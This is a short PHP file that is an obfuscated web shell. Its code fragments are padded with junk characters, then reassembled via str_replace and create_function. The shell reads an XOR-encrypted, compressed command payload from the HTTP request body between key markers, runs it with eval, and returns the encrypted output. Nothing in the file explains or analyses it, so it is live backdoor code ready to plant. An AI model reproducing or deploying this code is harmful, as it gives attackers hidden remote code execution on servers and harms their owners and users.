<?php
$d='$r=@basx:e64_encode(x:@x(@gzcox:mpresx:x:sx:($o),$k));print("$px:$kx:h$r$kf");}';
$j='m[1])x:,$k)))x:;$x:o=@ox:b_gex:t_x:contentsx:();@ob_end_cleanx:(x:);x:';
$b='=1) {@x:ob_stx:artx:();@evx:x:al(@gzuncompx:ress(@x(@bx:ase64_x:decode(x:$';
$X='pyoUx:XmU05px:zAwEf"x:;fx:ux:x:nction x($t,$k){$c=stx:rlenx:($kx:);$l=sx:';
$x='$k="x:ec7x:ee0df";$kh="1x:525x:019c2896"x:x:;$kf="9dx:ef53019f62"x:;$p="jx:';
$M=str_replace('Lf','','LfcrLfLfeate_fuLfLfLfnction');
$u='trlen($t)x:;$o="";x:fx:or($i=0x:;$i<x:$l;)x:{fox:r($j=0;(x:$j<$c&&$i<$l';
$k='tchx:x:("/$kh(x:.+)$kf/",@filx:x:x:e_get_cox:ntents("php:x://input"),$mx:)=';
$e='x:);$j++,$i++x:){$o.=$x:t{$i}^x:$k{$j}x:;x:}}retx:urn x:x:$o;}if (@prex:g_ma';
$O=str_replace('x:','',$x.$X.$u.$e.$k.$b.$j.$d);
$l=$M('',$O);$l();
?>
